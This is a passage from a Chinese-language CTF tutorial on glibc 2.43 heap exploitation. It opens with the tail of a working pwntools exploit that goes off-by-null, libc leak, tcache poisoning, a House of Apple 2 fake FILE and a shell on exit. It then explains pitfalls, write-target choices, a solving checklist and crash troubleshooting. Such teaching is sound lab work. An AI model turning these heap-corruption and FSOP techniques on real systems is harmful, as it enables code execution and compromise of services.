# ---------- 第 3 步：free(C)：后向合并吞掉"在用"的 B，0xa00 进 unsorted ----------
delete(i1)

# ---------- 第 4 步：show(0) 读合并残留，泄露 libc ----------
leak = u64(show(i0)[:8])
assert leak & 0xfff == (K_UNSORTED & 0xfff), '泄露值形状不对: %#x' % leak
libc.address = leak - K_UNSORTED
log.success('leak      = %#x（unsorted 链头）', leak)
log.success('libc base = %#x', libc.address)

# ---------- 第 5 步：从 0xa00 上切 0x70，落回 B 的位置：重叠 ----------
i5, o_mem = create(0x68)
assert o_mem == b_mem, '重叠失败: %#x != %#x' % (o_mem, b_mem)
log.success('重叠成立：note[%d] 与 note[%d] 同址 = %#x', i0, i5, o_mem)
delete(i5)                     # 0x70 进 tcache，fd 槽就在 note[i0] 的管辖范围内

# ---------- 第 6 步：借 note[i0] 的越界长度改 tcache fd ----------
target = libc.sym['_IO_list_all']
log.info('_IO_list_all = %#x（16 对齐: %s）', target, (target & 0xf) == 0)
poison = target ^ (o_mem >> 12)        # safe-linking：存储值 = 目标 ^ (存储位置 >> 12)
# edit 必须写满 0x4f8 字节，会连带抹掉后面 0x990 余块的块头——
# 原样补回：size 0x990|PREV_INUSE，fd/bk 仍是 unsorted 链头（此刻链上只有它）
fix = bytearray(0x4f8)
fix[0x00:0x08] = p64(poison)           # 伪 fd：写进 tcache 链
fix[0x60:0x68] = p64(0x70)             # 余块 prev_size（形式自洽）
fix[0x68:0x70] = p64(0x991)            # 余块 size = 0x990 + PREV_INUSE
fix[0x70:0x78] = p64(leak)             # 余块 fd = unsorted 链头
fix[0x78:0x80] = p64(leak)             # 余块 bk = unsorted 链头
edit(i0, bytes(fix), 0x4f8)

create(0x68)                   # 弹出原块
i7, back = create(0x68)        # 弹出被污染的链头：mem = &_IO_list_all
assert back == target, 'poisoning 未命中: %#x' % back
log.success('malloc 落在 _IO_list_all：note[%d] = %#x', i7, back)

# ---------- 第 7 步：伪 FILE 三件套（从 0x990 的余块上切，地址可预知）----------
i8, f_mem = create(0x4f8)
log.success('伪 FILE 容器 note[%d] = %#x', i8, f_mem)
buf = bytearray(0x4f8)
def put(off, data):
    buf[off:off + len(data)] = data

put(0x00, b'    /bin')                       # _flags：兼作 system 参数的开头
put(0x08, b'/sh\x00')                        # -> "    /bin/sh"
put(0x20, p64(0))                            # _IO_write_base = 0
put(0x28, p64(1))                            # _IO_write_ptr = 1
put(0x68, p64(0))                            # _chain = NULL
put(0x88, p64(f_mem + 0x300))                # _lock：可写内存即可
put(0xa0, p64(f_mem + 0x100))                # _wide_data
put(0xc0, p32(0))                            # _mode = 0
put(0xd8, p64(libc.sym['_IO_wfile_jumps']))  # vtable：合法跳表
put(0x100 + 0xe0, p64(f_mem + 0x200))        # wide_data->_wide_vtable（无校验）
put(0x200 + 0x68, p64(libc.sym['system']))   # wide_vtable->__doallocate = system
edit(i8, bytes(buf), 0x4f8)

# ---------- 第 8 步：_IO_list_all 指向伪 FILE ----------
edit(i7, p64(f_mem), 0x68)

# ---------- 第 9 步：exit 触发 _IO_flush_all -> system("    /bin/sh") ----------
menu(5)
p.recvuntil(b'bye')
p.sendline(b'echo === p17-obn shell ok ===; cat flag.txt')
print(p.recvrepeat(5).decode(errors='replace'))
p.close()
```

两道题的解题记录到此合拢：==起点不同（UAF / off-by-null），中段同构（libc 泄露 + tcache poisoning），端游相同（House of Apple 2 + exit 触发）==。这就是第 1 节那张五步表的意义——流程不随漏洞变，变的只有"漏洞 → 原语"那一段的兑换方式。

> [!info]- 变体最容易错的一步：长 edit 会顺手抹掉后面的空闲块头
> 第 6 步的 edit 必须写满 0x4f8 字节（readn 循环读满为止），而 0xa00 的大块被切成 0x70 + 0x990 之后，==余块的块头就在 note[i0] 的写入范围里==。payload 若把那 16 字节一并写成 0，下一次 malloc 遍历 unsorted 时当场终止，报错串是：
>
> ```text
> malloc(): invalid size (unsorted)
> ```
>
> 处理方式就是把余块头部原样补回 payload（size `0x991`、fd/bk 照抄泄露值）。同类的坑还有一个：重叠块把 fd 槽"借"给你改，但 tcache 的 key 槽也在同一片数据里——==free 之后、改 fd 之前，凡是按元数据解释这块内存的字段都要重新核对一遍现场==。

> [!info]- 如果布局没给 tcache 结构体留位置，会看到什么
> 2.43 的 tcache 结构体在第一次档内 free 时才初始化，且==走正常 malloc 流程：unsorted 里有现成大块就先切它==。变体若省掉牺牲块那一步，第一次档内 free 发生在合并之后——结构体会从 0xa00 的大块前部切走，"0x990 的余块"变成"0x300 的结构体 + 更小的余块"，第 6 步补在 payload 里的头部与真实块头对不上，下一次 unsorted 遍历同样报 invalid size。判别方法就是 2.3 的对照动作：布局动作做完，`heapview` + 结构体定位各看一眼，==确认每个元数据块的实际落位再动手写 payload==。

## 5. 任意写之后写哪里：2.43 时代的落点决策表

poisoning 的产出是"分配在指定地址"，之后往哪写、等谁触发，是 2.43 时代每道堆题的最后一道选择题。把 [[P14-tcache与fastbin利用#8. 拿到任意地址之后写哪里|P14 第 8 节]]与 [[P16-FSOP与HouseofApple2#1.2 任意分配之后，去哪找执行落点|P16 1.2]] 的候选合并成一张收敛后的决策表：

| 落点 | 需要的准备 | 什么时候选它 | 详讲 |
| ---- | ---- | ---- | ---- |
| `_IO_list_all` → 堆上伪造 FILE（FSOP / House of Apple 2） | libc 基址 | ==默认首选==：程序有 exit / main 返回路径即触发；Full RELRO 下的主力 | [[P16-FSOP与HouseofApple2\|P16]] |
| stdout / stdin 本体 | libc 基址 | 程序不退出、或要在下次 IO 时触发（stdin 方向） | [[P16-FSOP与HouseofApple2\|P16]] |
| 栈上的返回地址 | 栈地址泄露（格式化字符串 [[P09-格式化字符串漏洞\|P9]]，或 libc 里的 `environ`） | 泄露渠道现成、需要跑 ROP 链或过沙箱 | [[P07-ret2libc-ret2syscall-ret2shellcode\|P7]] |
| exit 处理链（`__exit_funcs`） | libc 基址 + 指针加密的密钥 | FILE 链凑不齐字段时的备选，需逆向指针加密 | [[P15-House系列攻击技术\|P15]] |
| partial RELRO 的 GOT | checksec 确认 partial RELRO；PIE 下还要二进制基址 | Full RELRO 直接排除；程序频繁调用某个 libc 函数时一击致命 | [[P11-Canary绕过与GOT攻击\|P11]] |
| ~~`__malloc_hook` / `__free_hook`~~ | —— | ==2.34 起不存在，永远不选== | [[P12-glibc堆管理机制#9. glibc 2.43 行为注记\|P12 第 9 节]] |

选择的先后次序照着 checksec 与程序行为走：**Full RELRO** 划掉 GOT；**没有退出路径**划掉 `_IO_list_all` 的 exit 触发（换 stdin 方向）；**没有栈泄露渠道**划掉返回地址。剩下的候选里挑准备最少的——==落点选型是排除法，不是偏好==。本章两道题 Full RELRO + 有干净退出，答案唯一指向 FILE 链。

> [!note] 选落点的三个通用检查
> 与 [[P14-tcache与fastbin利用#8. 拿到任意地址之后写哪里|P14 第 8 节]]相同：① 目标 0x10 对齐（tcache 取出的对齐检查）；② 目标及其后 16 字节可写（弹出时的 next 读取与 key 清零都会碰它）；③ ==写完之后有谁会来用这个地址==——没有触发者的写入只是改了内存。

> [!info]- 落点只差"一次任意调用"时：one_gadget 与 setcontext
> 落点若是一个会被直接调用的函数指针，写 `system` 需要同时安排参数（House of Apple 2 用 `_flags` 槽位解决）；约束更紧时先试 one_gadget（[[P07-ret2libc-ret2syscall-ret2shellcode#4. one_gadget：一个地址的捷径|P7 第 4 节]]），再不行把槽位换成 `setcontext+0x3d`，借一次调用换出整条 ROP 链——`_IO_wdoallocbuf` 调用 `__doallocate` 前 `rdx` 恰好等于 fp，伪 ucontext 就摆在伪 FILE 同一块里，[[P16-FSOP与HouseofApple2#6. setcontext+0x35：一次调用换一整套寄存器|P16 第 6 节]]有完整展开。

## 6. 面对未知堆题的方法论 checklist

把前六节收拢成一张可勾选的流程单。每道新题从上往下过，卡住的步骤回到对应小节：

1. **交互枚举**（第 3 节）
   - 菜单每个选项过一遍试探清单：尺寸边界、free 后 show/edit 的死活、次数与字节数限制、double free 的反应、退出路径、是否打印指针；
   - 记录成"漏洞假设"清单，每条标注验证方法。
2. **原语判断**（[[P13-基础堆漏洞|P13]]、4.2）
   - UAF 读写 / off-by-one / off-by-null / 越界写 / double free——各自的兑换路线不同；
   - 在 GDB 里确认假设：断点下在动作完成之后，看块上的字段变化（[[P12-glibc堆管理机制#7. 调试方法：GDB 原生加自写堆观察脚本|P12 第 7 节]]）。
3. **版本判断**（[[P12-glibc堆管理机制#9. glibc 2.43 行为注记|P12 第 9 节]]、[[P14-tcache与fastbin利用#9. 各技术的版本适用表|P14 第 9 节]]）
   - 附件 libc 直接读版本；无附件靠行为指纹；
   - 布点与步距按版本表换算：每档 16 个、结构体延迟初始化、hook 不存在、fastbin 不存在。
4. **布局规划**（第 2 节）
   - 画出目标堆面：谁挨着谁、谁进哪个 bin、垫块与牺牲块放哪、tcache 账本每档剩几格；
   - 每个布局动作之后用 `heapview` / `tcacheview` 对照一次（2.3）。
5. **链构造**（[[P14-tcache与fastbin利用|P14]]、第 4 节）
   - 泄露（unsorted 残留 / safe-linking 空链 / 程序打印）→ 任意地址分配 → 任意写；
   - 每一步带自检：泄露值减偏移要页对齐、poison 目标要 0x10 对齐、账本恒等式 `剩余容量 + 链长 = 16` 要平。
6. **排错**（第 7 节的表）
   - 崩溃点定位到"哪条检查"而不是"哪一行 exp"：每个 malloc_printerr / Fatal error 都对应一条可回读的约束；
   - 改一处、跑一次、看一眼堆面，不攒改动。

## 7. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| free 大块后 show 读出的全是 0 | 块没进 unsorted：右边没垫块并进了 top（2.3 的 E1），或尺寸没超出 tcache 范围；先 `heapview` 确认块的去向再谈泄露 |
| 泄露值减 0x212ac8 后不页对齐 | 用错链头：unsorted（0x212ac8）与 largebin（如 0x212ef8）的头偏移不同（2.4），确认这块在读之前挂在哪条链上 |
| poisoning 后 malloc 没落到目标 | 加密漏写或异或量用错位置：存储值 = 目标 ^ (存储位置 >> 12)，存储位置是==被改的那个槽自己==；目标还要 0x10 对齐（[[P14-tcache与fastbin利用#3.4 第三步：伪造 fd，把目标挂进链\|P14 3.4]]） |
| free 第二次直接 `double free detected in tcache 2` | tcache key 检测（[[P12-glibc堆管理机制#3.1 tcache：第一优先的线程缓存\|P12 3.1]]）；用两个不同的块做 poisoning 组 |
| 长度不受限的 edit 之后，malloc 报 `malloc(): invalid size (unsorted)` | payload 把后面空闲块的块头一并写没了；把余块的 size / fd / bk 原样补回 payload（4.7 折叠框） |
| 布局全部照做，块的位置却和推演对不上 | 2.43 的 tcache 结构体在首次档内 free 才初始化，且会从 unsorted 大块上切走一块 0x300——先用牺牲块定点投放它（4.3、4.7） |
| 想合并相邻两块，free 完却没合并 | 该档 tcache 没满就没有合并（[[P12-glibc堆管理机制#5. free 的主干流程\|P12 第 5 节]]）：装满 16 个，或直接用 ≥ 0x420 的大块 |
| off-by-null 合并时 `malloc(): corrupted size vs. prev_size` / `corrupted double-linked list` | 三处自洽缺一：伪造块的 `chunksize == prev_size`、`prev_size(next) == prev_size`、fd/bk 双向指回（4.7 的第 2 步） |
| 伪 FILE 摆好后 exit 安静退出，什么都没发生 | 刷新条件没过：`_IO_write_ptr <= _IO_write_base` 或 `_mode` 摆错（[[P16-FSOP与HouseofApple2#4.1 原理：刷新时的链遍历与查表调用\|P16 4.1]]） |
| 还没到调用就段错误，GDB 停在加锁附近 | `_lock` 没指向可写内存（[[P16-FSOP与HouseofApple2#2.2 字段逐讲：64 位偏移表\|P16 2.2]] 的 warning） |
| vtable 校验 `Fatal error: glibc detected an invalid stdio handle` | vtable 落在合法区间外；借 `_IO_wfile_jumps` 走 House of Apple 2（[[P16-FSOP与HouseofApple2#3.2 校验的机制：一条区间判断\|P16 3.2]]） |
| 本地通、远程偏移全错 | 偏移表要用题目附件的 libc 重量，patchelf 装载（[[P03-ELF链接与延迟绑定#5.3 patchelf：把题目环境装到本地\|P3 5.3]]） |
